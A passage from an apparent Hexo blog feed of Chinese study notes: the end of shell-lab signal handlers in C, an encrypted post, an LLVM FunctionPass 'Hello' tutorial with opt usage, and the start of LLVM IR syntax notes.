class="built_in">puts</span>(<span class="string">&quot;sigint_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * sigtstp_handler - The kernel sends a SIGTSTP to the shell whenever</span></span><br><span class="line"><span class="comment"> *     the user types ctrl-z at the keyboard. Catch it and suspend the</span></span><br><span class="line"><span class="comment"> *     foreground job by sending it a SIGTSTP.  </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: entering&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if fg exists then send SIGSTP to job</span></span><br><span class="line">    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">        <span class="keyword">if</span>(kill(-pid, SIGTSTP) &lt; <span class="number">0</span>)</span><br><span class="line">            unix_error(<span class="string">&quot;kill (tstp) error&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(verbose)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;sigstp_handler: Job [%d] (%d) stopped\n&quot;</span>, job-&gt;jid, pid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// end handler</span></span><br><span class="line">    <span class="keyword">if</span>(verbose)</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;sigstp_handler: exiting&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Malloc-Lab"><a href="#Malloc-Lab" class="headerlink" title="Malloc Lab"></a>Malloc Lab</h3><p>先占个坑</p><h3 id="Proxy-Lab"><a href="#Proxy-Lab" class="headerlink" title="Proxy Lab"></a>Proxy Lab</h3><p>+1</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>这是一个笔记</title>
      <link href="posts/17122941/"/>
      <url>posts/17122941/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Here's something encrypted, password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="c314b1e2f429cbc14f733158a67b147b6a6e842c23151cf20bd0483b5b62d0b0">23c98bc4e88201af417863563b43fca032f5a6222ede06686b94a7df44e9ad2da3cd47fb7bfbc0a5a0c8396e4760499d82fd9499edb5298ee890d2afb5ef29b7b47e27e62b9addbcffc3381cb7fb3d652ef4bdaf0c891338a231436e0395b192b73df6ad3bc96a03fc0571da5902013455675be28ac39fcd2670b17b8e5d9c3db7d5b4cb2774493599221f233ee72bcc44af197661772dc077c31d56e0ef34fa84ee7133fa7e986c73c934f146360c72396a120d3f60b92942b0ac67dfbe1c4bd7048e32ccd9f6558d2f0e0b376ede37fe5b6ae0ed35a53b9cd1a0922e557f47b81465127945e27d8cc7737272053588f2f1a1df58a9b1573cbded12635b8b7931d686a8468e28cfe9e47d434155bd40ab715aa2aad93e804a8a9470787fab9ff969fcc7f12a9ae41dacbef0670f7839df7f7d7561e1ae79c6449ba3c258df755088a7f3e8e5e35dadb53a8627e0168f5f6fb4321884eaa877b4aace6f39074896ad027404b1cf51f1daa453af9ccd69ba067fcac988cdb8c37b90f614bb35418de96a2f8498e2f64d1f44f18eb4ccca9d686b2cdb73ce8d673073529904b5010b1eb9779c3538cb504618a7c819c9bbd0643bfdc8b8bd6e8ae52e7b2019344ff494584fcbca518cf7207536db50fa53db7bf1f8c144aa89e8175d7b3168bfac5e93a2047797e58f7fadc0afae12ebca91c5015ce956237e5ed9a2092135235f942e47406d4efae63645dcf9e1d2f04882cf88ca09b5f29657ad86cc365b75b7f4068c648ddba38b0aeda33d44b4beb9dfb61e62709f5ad4cee7996702ca6a591fb1e63c802117dbfe507556ec3e0545c63773c856b1161202e98ea9d069020329f9a3d5b2aa36c5bc7266660a23ec468181cf41c696938430c4e143487d314366eb91b725543407a6ee65c51eba78328e96a29655d466fe82a4675b16b419118c9c6586cdc63b3c3f95e38a099a8d209acfd2c532a6a2a541801c830b7ac479c2bf65e1b8e013554f4a6e1f3e23a8d83c2c1e45ee35a28236218674fa5a3845c1b97cf2330a50262a348dbaa2605a910e0918272b07d978ab4e1f8ac891c7dd965425fd4ace58d3f46ca785f38e49aea18e062572b298bb7737e285e9dd553d3ea5a45343fcb587e219e7b7dec2314d5911ba5e039160725eb47029a98e88564c5ad7fb753983b8427f75365133716778ede115efcb9c206846f7547e2e94ce4da602f2686ed3fb0832e74c295bd4b2f1894a620d284c0f415a060d7e31882f7618fa9ed2f9a2818474511a6413e0bbdc2f5a7ff9088e81bb48c54e46b0f1b41f6fd7c466b56b552d723576370b72d56981b13993cc40dff30fc911d711d96dd080dc16966af42e3aaee78ee84b99f181851d2d610cb05c063ce0efd9b95a77b85cd632c2b49968e7d937c4648b2db49d28a358fb9295fe8e56b92657f756459eda15501ced7ba731763220aab5d63df2bf0cff6b3008be0cf0d8680e7727566aabea8d61126ddef693f7ccde895740338acb91478c41651d854c956b519da17d7affbc0ffdaa3b65a437af6217e7560747912e51f63997e87fbd87650326695d02b003de06405f97c9ef8539e265ba06bf780c1ec433a2d84272cae8c00c46cc2126f6b02287c1f30f86c10e198c8d28ba04970b51a5001d5e51fc01f90e25ba43c6a29f34900c2d78b485eba631e286c3e6043f936eaa12b51d72bd2de0822fbe3669ff57c2c4ba3e16fda2ec1a2009867aa57f42e2a723e561912e916f5e7c9ab05e66367ec1242cb3f1b2a66fa2fb687ac0a0ddb5d4b64aa33ab60c877633d8a28102479a0f4111dadf0be93ac543fea07c920587a2fea470ebc23b9d9ffae34604a8ed0ce6976112eda9aed69d180f86957d9fde53dfcc402df2fd2956505a7cb585e07f2815edaf0ec30376538d0a34cea5cceb23896dfd792719ed871690e036ee77b13ae38f205b1f2007cf045ca2ced294bcc1c107114e140fca4968979f548a6c28449191364fbeee89c903ec31a54021c11ec040da26861d3ff52e9cf7130dc68ffc75a4735d838550fcd86da6dd95a6e2b241f876071bac8426e35a67b6e258c9ef98ccfc7dd7c0cbfeece9a04d1e61cbf895b3dfc049c5662dfd9209440a7f47f4a02df8ce700a72040f5b4859cb83190d8ba67263d3b8e5d5c798df559f00193e95ea83af2aa5c3d2466169e26bdb4f1088cabe5aa8835e8b2165cdddb7fe412887265ea7d0ba2c8b027a21e585e698025eed14c72c3b1df7b24a46c905d78e02b9be447b8b5cbbbbc6c9eaea17f3b4e4454fe4f7989c9e48f2a9f1e14dbcfb2729c235b25a8d195a817333b94eace9354196b0a7d3f538970ca964627b3004b26f86c4d8e4adfff36e1eda4bfe7cf83fb72292f043c3f78fec3a5789623c6dc34298eed77dc502ee5b538b3d34ece4dbae2703a4fc1bef2abd3fae5ef9feafd8459e991074d38092f44986f2ea8fe17fc1f7015e8e9e96e223d562acb642fdf43c34a3bf2785125d6e0fd530c0af42b5e81084d26f45543e870ff6e03eb5d29b7f4892fa45116b871874985d583fad928a5e360059df198928d6503db8bb37a470604638aa24b19d7e3e6c9379b03e6392126a71e642e415068486f8876b43d81c05cd4ac1ad9d0b8d6b42dd0216ade1be64412041bae286710f3cbcc11414cd6aa8dbc8870fd4cb551f16a30fda203904284f93bb80b8267d294d464c3da009660f47782f6db874860d9aa00c6e20e7c086af9b17bf9f4ceaf01a0a020ad5fb196691b3b531c0437784d657371baf276b2fb39d1a146878ba775ca3cf70df5862b6eee87ee15079e6e548e500026ae687188b873c19a0bfe4bfd0fdf0a6a23aef49871f15f8c46372678c51b5050ceaf50010697d8f67ca0201cb89c76f6165ddfbf7d4139f8b68effb678bdc3ad0b5971b29b126f5aa63531396d7c5203b4e32c19b3c59300d439a89ee0757e20b711e7c7a271b33a7904592d7f633361afb1568643643bdba34b866c38552034024a96dd4624ccb1d20f5d3afda41337d1dc4666afa67bb88c43e87336008f65ee9cd1428aa5cccc20fdd05cf3b20f45359ba3832fe4c2a9a04b383bf012ace3bb746bced9fc828a5495ad7a575fc2f48db0015dc382ecb0743568d542dce8bf82577fd06e9adc849ec6f998be2188e6b91ad9a7dc41f16465ad6c64484932c1f63ea29ca558538422cf5c384a3a67a52bff5fb645a9387f267ebe5a2732f4a25d0e7def59cb7dc6f4e9b1c7872003dffde8e3629ffb61dd4c7aba331ddeea3afa6bb08629a93a69d3620d61b705dbbd756596e69ff1ce2585c37cd955712d663547b9638fcb416815b354976b05580e23ba8d6486e1bdbd7a5770276a57fb5723107e5101744480607ac9f9aceb335f9edba2923273803b634a5c22971833fd579234cad1147290d2801b17fbc0f4309df963888a0a070cf5e0ba923584660563ef5f63779a26bd2f33b382a47f4b951e6476bc945026730e935ef2ab994f9ef20009b01aa4bd5d93d98674a639dc4606f35f83b1f3d8e76126f178caf5c2a1f9e6d1b252a5c11fab2526d45a367e7d29c18e0de12b8c683f1990a2194192dc269fa84e0025f8c25e3b289047ab3b2de89a56ccca3746523a2f6cc0966ffbbb38639535d74a665d48fcdb443457445c86ddf41ead46e48c954aa9f49b4c8bd3a4fec184c07bbac88321972ac7380be263eed4928fbe56a4de90daee723e26c2de793d95d158569083b9ba2b33e4fbc2b8a9996f1935cd19e9be0490eadc3311a41265a44fe142f294708aa2440440f5e59849a8d619d3e4b64247b543333c465116aa04894bb7dc99f0dc328e5a8d02f3da3f8e7cc7dbe84ff68dc004eb475241b64fea32a208026a20d97429fed849257f6f5a12398146fda63d57514a5e4c3cb5f7e5e9bdcd5c4dbdae9ad98170f1ee30f97cc703d794b6631cade1702f94590ebcf465dbecabeb10a17d7bdae6ac4b25d8508209a029a9731cf962ef278aec1e80d2402359a251723090fb783b6273cdd9191f0b6e6bdb5356a985bf873edf940c5f3325ec6ddb8376cc84dbff1d062e58a8b996e19a0a4809cd289556318f7fd17fc6ab535b3d36a9f6443a4b340e74991f0686ef5d7a47fe645314130dbde9b3b96cc7c86ec0ad98852fcd233914169a616dc6fdd98f3000f0b4a89bd5e87d7a52454fcf95d656d7266a4a250bae1fbe8eed25add9277e189c3700523e45da33d83d65e30fed465ca5b93680c21b0a55a3e4028f508924cea75a8f6c26d6b743c63a1429549b89b3a70ad06147b652a0e839ce85e9305510eeadf304185e766af0df819cdd73bf77d5a36215127f691a51c7f7564fbdb3343588a43d616eb3874e5e8740dad0754528e69c1128076dc816ac3e05fa1df65439c0a772b5ba3a6a42d6b5f41abb5655699779dfc2258b206d74fbe83a887ce6444bc157f8e53f35f40cdab895d7d25dd3a8bc71b7d8885a0bdd30388cd786ee2eeae1d61b8b4cd061b4c10f9936e2a5dff3997a3ec1ff51e3c4743c06dac19261d56014caf5a8b62069d8bee9a35c79c458488c5e06f656b46fb00bfb1f1b807f343100aab409771285624e3786adfd46d0c6f7e0bbcc7c4c2192806bd75a9b3d3981193c3a742465b818774af46cbf7d38cf6e7735459f176071081a7834a0bdff4c9b8f18cacc43793ea0d116ee77704d5eec125dbfbf3057005903e9d99b18e7bc08adea0f282219f79075949c22212cc3e755492112dfe6f370abf6fe95c11490d2d013fd0e09327f030c37c714a61ef15488732f278cf3c34845c7c4f72b196711e8e62c475e13e83e11f7aa2d7f8c3a26e6fb31071e1fc5653b46f53752a93b2fca3180723eee1c4cef025be3d6de04fa05922064533c071a541296b43356432595f795e8cc648a393b668ba988cba5c634ea1a45285be0438bd7d6cf28f1b646eb7fd0f0ee0e24b4dd7c4bd6901233041fc7ac125b312b80f92ad9bff596692cff220b0195a8d3e69269e4e3898f8d1c0506ccda75e7fc557d93afcb207998694c33e7f68f8a7eec41d36be9ed26bfa1c13a15147b269f26b0e3fc608a2d8234a9688e7efe15cafde7cad34ebcb4133a4b1c7f9f9d36615d1c6d48f205974ea2f8ecc34a5535075d0701d7a4e1f8f92a1bdc088b978b49113211f6c8936b91290fdc15b6e571f01a07b1d7c5d09f80c9d529fdcf9047e397dd5ba7ba24914b9e85fa641ae8cbfe82c39a6cc0f7fd83cf54b7e372047678d2d08c801ae740c97738ef0f063536c315cbbbcc066a7778d4f61ffffdbfa293f1831b3467a7bd8efe8a0acb70522af7fc9a485e1b36958552ea26d9bc695f151ab8226</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pass&quot;入门&quot;</title>
      <link href="posts/e671613c/"/>
      <url>posts/e671613c/</url>
      
        <content type="html"><![CDATA[<h2 id="pass简介"><a href="#pass简介" class="headerlink" title="pass简介"></a>pass简介</h2><p><code>pass</code>：llvm pass 是 llvm 架构的重要组成部分。pass 的主要工作是：对代码进行分析、优化代码。所有 llvm pass 都是<code>pass</code>的子类，通过通过重写从中继承的虚方法来实现功能<code>Pass</code>。LLVM Pass框架的一个主要特性是它根据传递遇到的约束（由它们派生自哪个类来指示）来调度传递以高效的方式运行。</p><p><code>pass</code>大致可以分为两类：分析和转换。分析类的<code>pass</code>以提供信息为主，转换类的则要修改中间代码。</p><p><code>pass</code>类如下：</p><ul><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-immutablepass-class">ImmutablePass</a>：不运行, 不改变状态也永不更新的<code>pass</code>, 一般情况下用于显示编译器的配置信息.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-modulepass-class">ModulePass</a>：用于执行任何非结构化的过程间优化。通用类型的<code>pass</code>，将整个程序示为一个单元处理。用<code>virtual bool runOnModule(Module &amp;M) = 0;</code>来实现<code>ModulePass</code>.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-callgraphsccpass-class">CallGraphSCCPass</a>：用于被那些需要从底向上(bottom-up)遍历call graph的pass调用.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-functionpass-class">FunctionPass</a>：是以单个函数为作用域的<code>pass</code>, 每个函数间是相互独立的, 相互之间无法影响</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-looppass-class">LoopPass</a>：是以单个<code>loop</code>为作用域的<code>pass</code>, 每个<code>loop</code>间相互独立. <code>LoopPass</code>以嵌套方式处理循环, 外层循环最后处理.</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-regionpass-class">RegionPass</a>：类似与<code>LoopPass</code>，但是在函数中的每个单入口单出口区域执行。 <code>RegionPass</code>以嵌套顺序处理，以便最后处理最外面的区域。p</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-basicblockpass-class">BasicBlockPass</a>：用于实现本地优化，优化通常每次针对一个基本块或指令运行。</p></li><li><p><a href="http://llvm.org/docs/WritingAnLLVMPass.html#the-machinefunctionpass-class">MachineFunctionPass</a>：类似<code>FunctionPass</code>, 区别在于前者属于<code>LLVM code generator</code>(后端), 生成架构相关代码, <code>FunctionPass</code>属于<code>LLVM optimizer</code>(中端), 生成通用的IR.</p></li></ul><h2 id="pass”入门”"><a href="#pass”入门”" class="headerlink" title="pass”入门”"></a>pass”入门”</h2><h3 id="编写-分析"><a href="#编写-分析" class="headerlink" title="编写/分析"></a>编写/分析</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~&#x2F;llvm&#x2F;llvm-7.0.1.src&#x2F;lib&#x2F;Transforms&#x2F;Hello</span><br><span class="line">$ ls</span><br><span class="line">CMakeLists.txt  Hello.cpp  Hello.exports</span><br></pre></td></tr></table></figure><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p>可以参考官方教程再自己搞一个。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Pass.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/Function.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/IR/LegacyPassManager.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;llvm/Transforms/IPO/PassManagerBuilder.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">  Hello() : FunctionPass(ID) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">    errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">    errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                             <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> RegisterStandardPasses <span class="title">Y</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PassManagerBuilder::EP_EarlyAsPossible,</span></span></span><br><span class="line"><span class="function"><span class="params">    [](<span class="keyword">const</span> PassManagerBuilder &amp;Builder,</span></span></span><br><span class="line"><span class="function"><span class="params">       legacy::PassManagerBase &amp;PM) &#123; PM.add(<span class="keyword">new</span> Hello()); &#125;)</span></span>;</span><br></pre></td></tr></table></figure><p>对上述代码的一些分析：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br></pre></td></tr></table></figure><p>开始一个新的匿名命名空间。在<code>C++</code>中匿名命名空间会引入静态全局作用域，类似C语言中的<code>static</code>关键字，它使在匿名命名空间内声明的内容仅对当前文件可见。</p><p>接着，声明我们的<code>Pass</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Hello</span> :</span> <span class="keyword">public</span> FunctionPass &#123;</span><br></pre></td></tr></table></figure><p>声明了一个<code>Hello</code>类，它是<code>FunctionPass</code>的子类。<code>FunctionPass</code>类一次只操作一个函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> ID;</span><br><span class="line">Hello() : FunctionPass(ID) &#123;&#125;</span><br></pre></td></tr></table></figure><p>声明一个 pass 的 ID，llvm 将会使用ID来定位这些pass。避免使用复杂的C++运行机制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span> </span>&#123;</span><br><span class="line">      errs() &lt;&lt; <span class="string">&quot;Hello: &quot;</span>;</span><br><span class="line">      errs().write_escaped(F.getName()) &lt;&lt; <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;; <span class="comment">// end of struct Hello</span></span><br><span class="line">&#125;  <span class="comment">// end of anonymous namespace</span></span><br></pre></td></tr></table></figure><p>定义<code>runOnFunction</code>方法，覆写从<code>FunctionPass</code>继承的虚函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> Hello::ID = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>初始化Pass ID。LLVM使用ID的地址来标识Pass，因此初始化值并不重要。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> RegisterPass&lt;Hello&gt; <span class="title">X</span><span class="params">(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;Hello World Pass&quot;</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Only looks at CFG */</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="literal">false</span> <span class="comment">/* Analysis Pass */</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>注册类<code>Hello</code>，第一个命令行参数<code>hello</code>，并命名为<code>Hello World Pass</code>。最后两个参数描述了它的行为：如果传递遍历CFG而不修改它，则第三个参数设置为<code>true</code>; 如果pass 是分析 pass，那么将会有第四个参数，为<code>true</code>，反之则为<code>false</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> build</span><br><span class="line">$ make</span><br></pre></td></tr></table></figure><p>在我们刚刚创建的<code>build</code>内，执行 <code>make</code>，得到一个新文件<code>LLVMHello.so</code></p><p>我们在<code>~/llvm/build/lib</code>下可以找到对应的文件。</p><h3 id="使用opt命令运行pass"><a href="#使用opt命令运行pass" class="headerlink" title="使用opt命令运行pass"></a>使用opt命令运行pass</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ clang -S -O3 -emit-llvm hello.c</span><br><span class="line">$ opt -load LLVMHello.so -hello &lt; hello.ll &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">$ opt -load LLVMHello.so -hello -time-passes &lt; hello.bc &gt; /dev/null</span><br><span class="line">Hello: main</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                      ... Pass execution timing report ...</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 ( 56.3%)   0.0001 ( 56.3%)   0.0001 ( 56.4%)  Bitcode Writer</span><br><span class="line">   0.0000 ( 37.0%)   0.0000 ( 37.0%)   0.0000 ( 37.8%)  Hello World Pass</span><br><span class="line">   0.0000 (  6.7%)   0.0000 (  6.7%)   0.0000 (  5.8%)  Module Verifier</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br><span class="line"></span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">                                LLVM IR Parsing</span><br><span class="line">===-------------------------------------------------------------------------===</span><br><span class="line">  Total Execution Time: 0.0001 seconds (0.0001 wall clock)</span><br><span class="line"></span><br><span class="line">   ---User Time---   --User+System--   ---Wall Time---  --- Name ---</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Parse IR</span><br><span class="line">   0.0001 (100.0%)   0.0001 (100.0%)   0.0001 (100.0%)  Total</span><br></pre></td></tr></table></figure><p>我们可以使用opt命令通过您的Pass来运行LLVM程序。由于您已使用<code>RegisterPass</code>注册了Pass，因此一旦加载，您就可以使用 <strong>opt</strong> 工具访问它。</p><p><code>-load</code>选项指定 Pass 作为共享对象加载，加载后<code>-hello</code>才是有效的。（这也是注册Pass的原因之一）。因为 <code>-hello</code>没有修改任何东西，所以直接查看结果即可。</p><p>也可以通过 <code>opt -load LLVMHello.so-help |grep -i hello</code>来查看其他注册字符串，当然最后也可以查看一下运行时间。</p><p>大致了解了 <code>pass</code> 的流程和编写骨架吧。</p><p>参考：</p><p><a href="https://llvm.org/docs/WritingAnLLVMPass.html">https://llvm.org/docs/WritingAnLLVMPass.html</a></p><p><a href="https://www.cnblogs.com/Five100Miles/">https://www.cnblogs.com/Five100Miles/</a></p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> llvm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm IR学习</title>
      <link href="posts/6f86e98f/"/>
      <url>posts/6f86e98f/</url>
      
        <content type="html"><![CDATA[<h3 id="IR结构"><a href="#IR结构" class="headerlink" title="IR结构"></a>IR结构</h3><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://i.loli.net/2020/07/12/n2eB89dIkVY4OT5.png" alt="llvm" style="zoom:50%;" /><ul><li>Module：每个<code>module</code>包含全局变量列表，函数列表，该模块所依赖的库（或其他module）列表，符号表以及有关目标特性的各种数据。</li><li>Function：编程语言中的函数，包括函数签名和若干个基本块，函数内的第一个基本块叫做入口基本块。</li><li>BasicBlock：是一组顺序执行的指令集合，只有一个入口和一个出口，控制流只能从第一个指令进入该块。非头尾指令执行时不会违背顺序跳转到其他指令上去。每个基本块最后一条指令一般是跳转指令（跳转到其它基本块上去），函数内最后一个基本块的最后条指令是函数返回指令。</li><li>Instruction：指令是LLVM IR中的最小可执行单位，每一条指令都单占一行</li></ul><h3 id="IR语法"><a href="#IR语法" class="headerlink" title="IR语法"></a><a href="https://llvm.zcopy.site/docs/langref/">IR语法</a></h3><h4 id="获取IR"><a href="#获取IR" class="headerlink" title="获取IR"></a>获取IR</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ clang -emit-llvm -c hello.c -o hello.bc    <span class="comment">#二进制码</span></span><br><span class="line">$ clang -emit-llvm –S -c hello.c -o hello.ll <span class="comment">#获取IR</span></span><br></pre></td></tr></table></figure><h4 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h4><ul><li>LLVM 汇编语言中的注解以分号 <code>;</code>开始，并持续到行末</li><li>全局标识符要以 <code>@</code> 字符开始。所有的函数名和全局变量都必须以 <code>@</code> 开始。</li><li>LLVM 中的局部标识符以百分号 (<code>%</code>) 开始。标识符典型的正则表达式是 <code>[%@][a-zA-Z$._][a-zA-Z$._0-9]*</code>。</li><li>LLVM 拥有一个强大的类型系统，LLVM 将整数类型定义为 <code>i*N*</code>，其中 <em>N</em> 是整数占用的字节数。如：i32，i64</li><li>矢量或阵列类型声明为 <code>[no. of elements X size of each element]</code>。对于字符串 “Hello World!”，可以使用类型 <code>[13 x i8]</code>，假设每个字符占用 1 个字节，再加上为 NULL 字符提供的 1 个额外字节。</li><li><code>hello-world</code> 字符串的全局字符串常量进行如下声明：<code>@hello = constant [13 x i8] c&quot;Hello World!\00&quot;</code>。使用关键字 <code>constant</code> 